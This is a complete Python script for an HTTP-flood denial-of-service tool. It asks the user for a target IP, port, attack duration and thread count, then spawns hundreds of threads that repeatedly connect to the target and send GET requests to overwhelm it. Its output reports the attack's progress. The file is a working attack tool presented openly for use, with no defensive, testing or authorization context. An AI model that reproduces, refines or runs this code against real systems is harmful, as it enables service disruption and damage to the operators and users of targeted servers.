import os
import time
import socket
import threading
from banner import show_banner
from termcolor import colored

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def ddos_attack(ip, port, duration, thread_id):
    start_time = time.time()
    packet_count = 0
    
    while time.time() - start_time < duration:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, port))
            
            # HTTP GET request
            request = f"GET / HTTP/1.1\r\nHost: {ip}\r\nConnection: close\r\n\r\n"
            sock.send(request.encode())
            
            packet_count += 1
            if packet_count % 100 == 0:
                print(colored(f"[Thread-{thread_id}] Sent {packet_count} packets", 'green'), end='\r')
            
            sock.close()
        except:
            pass
    
    print(colored(f"\n[Thread-{thread_id}] Completed! Total packets: {packet_count}", 'cyan'))

def main():
    show_banner()
    
    try:
        target_ip = input(colored("Enter Target IP: ", 'yellow', attrs=['bold']))
        target_port = int(input(colored("Enter Target Port (default 80): ", 'yellow', attrs=['bold']) or "80"))
        duration = int(input(colored("Enter Attack Duration in seconds (default 60): ", 'yellow', attrs=['bold']) or "60"))
        threads = int(input(colored("Enter Number of Threads (default 500): ", 'yellow', attrs=['bold']) or "500"))
        
        print(colored(f"\n[+] Starting Attack on {target_ip}:{target_port}", 'red', attrs=['bold']))
        print(colored(f"[+] Duration: {duration} seconds", 'red', attrs=['bold']))
        print(colored(f"[+] Threads: {threads}", 'red', attrs=['bold']))
        print(colored("[+] Press Ctrl+C to Stop\n", 'yellow', attrs=['bold']))
        
        attack_threads = []
        for i in range(threads):
            thread = threading.Thread(target=ddos_attack, args=(target_ip, target_port, duration, i+1))
            thread.start()
            attack_threads.append(thread)
            time.sleep(0.01)  # Small delay to prevent overload
        
        for thread in attack_threads:
            thread.join()
        
        print(colored("\n[+] Attack Completed Successfully!", 'green', attrs=['bold']))
        
    except KeyboardInterrupt:
        print(colored("\n[-] Attack Stopped by User", 'yellow', attrs=['bold']))
    except ValueError:
        print(colored("\n[-] Invalid Input! Please enter correct values.", 'red', attrs=['bold']))
    except Exception as e:
        print(colored(f"\n[-] Error: {str(e)}", 'red', attrs=['bold']))

if __name__ == "__main__":
    main()
